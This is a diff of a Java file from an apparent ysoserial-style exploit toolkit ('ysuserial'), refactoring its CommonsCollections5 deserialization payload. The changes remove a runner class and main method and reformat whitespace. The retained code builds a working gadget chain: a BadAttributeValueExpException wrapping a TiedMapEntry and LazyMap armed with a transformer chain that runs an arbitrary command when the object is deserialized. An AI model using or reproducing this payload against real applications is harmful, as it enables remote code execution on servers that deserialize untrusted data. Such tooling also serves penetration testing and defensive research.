@@ -15,7 +15,6 @@ import org.apache.commons.collections.map.LazyMap;
 import org.su18.ysuserial.payloads.annotation.Authors;
 import org.su18.ysuserial.payloads.annotation.Dependencies;
 import org.su18.ysuserial.payloads.util.JavaVersion;
-import org.su18.ysuserial.payloads.util.PayloadRunner;
 import org.su18.ysuserial.payloads.util.Reflections;
 import org.su18.ysuserial.payloads.util.cc.TransformerUtil;
 
@@ -47,13 +46,13 @@ https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4e
  */
 @SuppressWarnings({"rawtypes", "unchecked"})
 @Dependencies({"commons-collections:commons-collections:3.1"})
-@Authors({ Authors.MATTHIASKAISER, Authors.JASINNER })
-public class CommonsCollections5 extends PayloadRunner implements ObjectPayload<BadAttributeValueExpException> {
+@Authors({Authors.MATTHIASKAISER, Authors.JASINNER})
+public class CommonsCollections5 implements ObjectPayload<BadAttributeValueExpException> {
 
 	public BadAttributeValueExpException getObject(final String command) throws Exception {
 		// inert chain for setup
 		final Transformer transformerChain = new ChainedTransformer(
-		        new Transformer[]{ new ConstantTransformer(1) });
+				new Transformer[]{new ConstantTransformer(1)});
 		// real chain for after setup
 		final Transformer[] transformers = TransformerUtil.makeTransformer(command);
 
@@ -63,9 +62,9 @@ public class CommonsCollections5 extends PayloadRunner implements ObjectPayload<
 
 		TiedMapEntry entry = new TiedMapEntry(lazyMap, "su18");
 
-		BadAttributeValueExpException val = new BadAttributeValueExpException(null);
-		Field valfield = val.getClass().getDeclaredField("val");
-        Reflections.setAccessible(valfield);
+		BadAttributeValueExpException val      = new BadAttributeValueExpException(null);
+		Field                         valfield = val.getClass().getDeclaredField("val");
+		Reflections.setAccessible(valfield);
 		valfield.set(val, entry);
 
 		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
@@ -73,12 +72,8 @@ public class CommonsCollections5 extends PayloadRunner implements ObjectPayload<
 		return val;
 	}
 
-	public static void main(final String[] args) throws Exception {
-		PayloadRunner.run(CommonsCollections5.class, args);
+	public static boolean isApplicableJavaVersion() {
+		return JavaVersion.isBadAttrValExcReadObj();
 	}
-
-    public static boolean isApplicableJavaVersion() {
-        return JavaVersion.isBadAttrValExcReadObj();
-    }
 
 }
